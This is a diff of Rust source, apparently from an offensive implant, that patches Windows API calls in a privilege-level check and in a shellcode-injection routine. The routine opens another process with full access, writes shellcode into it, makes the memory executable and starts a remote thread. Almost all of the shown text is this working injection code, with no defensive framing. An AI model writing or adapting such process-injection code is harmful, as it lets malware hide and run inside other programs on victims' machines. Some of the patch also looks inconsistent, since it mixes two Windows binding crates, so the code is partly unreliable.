@@ -247,19 +247,19 @@ fn integrity_level() -> String {
         let mut size: u32 = 0;
         let _ = GetTokenInformation(
             token,
-            TOKEN_INFORMATION_CLASS::TokenIntegrityLevel,
+            TokenIntegrityLevel,
             None,
             0,
-            Some(&mut size),
+            &mut size,
         );
         let mut buf = vec![0u8; size as usize];
 
         if GetTokenInformation(
             token,
-            TOKEN_INFORMATION_CLASS::TokenIntegrityLevel,
+            TokenIntegrityLevel,
             Some(buf.as_mut_ptr().cast()),
             size,
-            Some(&mut size),
+            &mut size,
         )
         .is_err()
         {
@@ -270,10 +270,10 @@ fn integrity_level() -> String {
 
         // Interpret the buffer as TOKEN_MANDATORY_LABEL
         let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
-        let sid = label.Label.Sid as *const SID;
-        let count = (*sid).SubAuthorityCount as isize;
+        let sid = label.Label.Sid;
+        let count = *GetSidSubAuthorityCount(sid) as isize;
         // SubAuthority is declared as [DWORD; 1] but is a variable-length tail
-        let rid = *(*sid).SubAuthority.as_ptr().offset(count - 1);
+        let rid = *GetSidSubAuthority(sid, count as u32 - 1);
 
         match rid {
             r if r < LOW => "Untrusted",
@@ -312,9 +312,13 @@ fn inject_cmd(args: &str) -> String {
 #[cfg(target_os = "windows")]
 fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
     use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};
+    use winapi::um::memoryapi::WriteProcessMemory;
 
     unsafe {
-        let proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+        let proc = match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
+            Ok(handle) => handle,
+            Err(_) => return format!("[-] OpenProcess({}) failed", pid),
+        };
         if proc.is_invalid() {
             return format!("[-] OpenProcess({}) failed", pid);
         }
@@ -333,17 +337,17 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
 
         let mut written = 0usize;
         let _ = WriteProcessMemory(
-            proc,
-            addr,
-            shellcode.as_ptr().cast(),
+            proc.0 as *mut winapi::ctypes::c_void,
+            addr as *mut winapi::ctypes::c_void,
+            shellcode.as_ptr() as *const winapi::ctypes::c_void,
             shellcode.len(),
-            Some(&mut written),
+            &mut written,
         );
 
         let mut old = PAGE_PROTECTION_FLAGS(0);
         let _ = VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
 
-        let thr = CreateRemoteThread(
+        let thr = match CreateRemoteThread(
             proc,
             None,
             0,
@@ -351,7 +355,13 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
             None,
             0,
             None,
-        );
+        ) {
+            Ok(handle) => handle,
+            Err(_) => {
+                let _ = CloseHandle(proc);
+                return "[-] CreateRemoteThread failed".into();
+            }
+        };
         if thr.is_invalid() {
             let _ = CloseHandle(proc);
             return "[-] CreateRemoteThread failed".into();
